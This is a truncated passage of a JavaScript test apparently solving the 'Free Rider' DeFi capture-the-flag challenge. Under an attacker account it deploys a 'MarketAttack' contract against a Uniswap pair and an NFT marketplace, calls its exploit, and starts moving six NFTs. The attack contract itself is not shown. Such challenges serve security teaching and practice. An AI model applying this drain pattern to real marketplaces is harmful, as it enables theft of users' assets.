...
describe("[Challenge] Free Rider", function () {
    ...
    it("Exploit", async function () {
        ...
        const marketAttack = await (
            await ethers.getContractFactory("MarketAttack", attacker)
        ).deploy(
            attacker.address,
            this.uniswapPair.address,
            this.marketplace.address
        )
        await marketAttack.exploit()

        const nftAttacker = await this.nft.connect(attacker)
        for (let tokenId = 0; tokenId < 6; tokenId++) {
            await nftAttacker["safeTransferFrom(address,address,uint256)"](
                attacker.address,
